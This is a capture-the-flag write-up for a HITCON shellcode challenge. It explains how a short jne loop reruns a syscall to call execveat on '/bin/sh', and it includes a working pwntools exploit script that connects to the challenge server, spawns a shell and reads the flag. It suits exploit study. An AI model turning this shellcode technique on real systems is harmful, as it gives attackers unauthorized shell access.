# Re: Easy to say
## Misc 255
> 30 solved

* disasm('\x75\xfa')
```asm
jne    0xfffffffffffffffc
```
* payload:
```asm
push rsp
pop rsi
xor edx,esp
syscall
jne    0xfffffffffffffffc
```
* First time read the `/bin/sh\x00` with padding to let length of it become 322 to the stack.
* After `jne` it continue at `xor edx,esp` with `rax = 322` , `rsi = /bin/sh` and cause `rdx = edx ^ esp ^ esp = 0`.
* Syscall again -> execveat( 0 , "/bin/sh" , 0 , 0 ).
```python
#!/usr/bin/env python
from pwn import *

# hitcon{sYsc4ll_is_m4g1c_in_sh31lc0d3}

context.arch = 'amd64'

host , port = '13.112.180.65' , 8361
y = remote( host , port )

sc = flat(
    0x3148ed3148fc8948,
    0x48c93148db3148c0,
    0xf63148ff3148d231,
    0x314dc9314dc0314d,
    0x4de4314ddb314dd2,
    0xff314df6314ded31,
    0x0000000000c48148
)[:-1]

#print disasm( sc )

_asm = '''
push rsp
pop rsi
xor edx,esp
syscall
'''

y.sendafter( ':' , asm( _asm ) + '\x75\xfa'  ) # jne    0xfffffffffffffffc -> jne -4

sleep(0.7)

y.send( '/bin/sh'.ljust( 322 , '\x00' ) )

sleep( 0.7 )

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```